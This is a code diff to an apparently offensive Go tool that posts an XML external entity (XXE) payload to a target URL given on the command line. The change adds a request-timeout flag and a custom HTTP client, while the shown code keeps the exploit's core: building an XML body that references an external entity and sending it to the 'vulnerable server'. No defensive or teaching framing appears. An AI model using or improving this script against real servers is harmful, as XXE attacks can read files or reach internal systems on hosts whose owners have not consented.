@@ -6,12 +6,16 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"time"
 )
 
 func main() {
 
 	// Define the URL of the vulnerable server
 	url := flag.String("u", "http://vulnerable-server.com/xxe-endpoint", "The url of the vulnerable server")
+
+	// Define the timeout flag
+	timeout := flag.Int("t", 30, "The timeout for the HTTP request in seconds")
 
 	// Parse the command line flags
 	flag.Parse()
@@ -24,8 +28,13 @@ func main() {
 		<foo>&xxe;</foo>
 	`
 
+	// Create a new HTTP client with the specified timeout
+	client := &http.Client{
+		Timeout: time.Duration(*timeout) * time.Second,
+	}
+
 	// Send the payload to the server using an HTTP POST request
-	resp, err := http.Post(*url, "application/xml", bytes.NewBuffer([]byte(payload)))
+	resp, err := client.Post(*url, "application/xml", bytes.NewBuffer([]byte(payload)))
 	if err != nil {
 		fmt.Println("Error sending payload:", err)
 		return
